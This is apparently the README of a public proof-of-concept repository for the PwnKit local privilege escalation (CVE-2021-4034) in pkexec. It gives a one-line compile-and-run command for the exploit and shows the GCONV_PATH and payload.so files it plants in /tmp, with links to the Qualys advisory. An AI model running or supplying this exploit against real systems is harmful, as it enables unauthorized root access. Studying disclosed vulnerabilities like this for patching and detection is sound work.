# CVE-2021-4034-POC

POC for pwnkit vulnerability discovered by Qualys.

Compile & execute:
```
gcc lpe.c -o lpe; ./lpe
```

Creates the following directory/file structure:
```
/tmp
├── GCONV_PATH=.
│   └── test
├── payload.c
├── payload.so
├── test
│   └── gconv-modules
```


## References
- https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
- https://hugeh0ge.github.io/2019/11/04/Getting-Arbitrary-Code-Execution-from-fopen-s-2nd-Argument/
- https://www.openwall.com/lists/oss-security/2017/06/23/8
- https://www.openwall.com/lists/oss-security/2014/07/14/1
